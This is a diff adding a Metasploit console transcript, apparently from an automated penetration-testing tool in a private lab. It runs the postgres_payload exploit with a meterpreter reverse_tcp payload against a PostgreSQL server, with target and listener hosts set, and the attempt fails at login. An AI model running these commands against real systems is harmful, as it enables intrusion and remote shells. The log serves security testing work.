@@ -1,0 +1,31 @@
+[1m[34m[*][0m Spooling to file /home/kali/forcevector/logs/sessions/msfconsole_transcript_192.168.139.128_20260709_092440.txt...
+resource (/tmp/tmp1siafmpx.rc)> setg SessionLogging true
+[0mSession logging enabled.
+SessionLogging => true
+resource (/tmp/tmp1siafmpx.rc)> setg ConsoleLogging true
+[0mConsole logging is now enabled.
+ConsoleLogging => true
+resource (/tmp/tmp1siafmpx.rc)> setg ExitOnSession false
+[0mExitOnSession => false
+resource (/tmp/tmp1siafmpx.rc)> setg CommandShellPty true
+[0mCommandShellPty => true
+resource (/tmp/tmp1siafmpx.rc)> use exploit/linux/postgres/postgres_payload
+[0m[1m[34m[*][0m Using configured payload linux/x86/meterpreter/reverse_tcp
+[1m[34m[*][0m New in Metasploit 6.4 - This module can target a [32mSESSION[0m or an [32mRHOST[0m
+resource (/tmp/tmp1siafmpx.rc)> set RHOST 192.168.139.128
+[0mRHOST => 192.168.139.128
+resource (/tmp/tmp1siafmpx.rc)> set RPORT 5432
+[0mRPORT => 5432
+resource (/tmp/tmp1siafmpx.rc)> set payload meterpreter/reverse_tcp
+[0m[1m[31m[-][0m The value specified for payload is not valid.
+resource (/tmp/tmp1siafmpx.rc)> set LHOST 192.168.139.129
+[0mLHOST => 192.168.139.129
+resource (/tmp/tmp1siafmpx.rc)> set LPORT 4444
+[0mLPORT => 4444
+resource (/tmp/tmp1siafmpx.rc)> exploit
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.139.129:4444 
+[1m[31m[-][0m 192.168.139.128:5432 - Login failed, fingerprint is 8.3.8
+[1m[31m[-][0m 192.168.139.128:5432 - Authentication failed
+[1m[34m[*][0m Exploit completed, but no session was created.
+[?1034h[4mmsf[0m exploit([1m[31mlinux/postgres/postgres_payload[0m) [0m> exit
+[0m
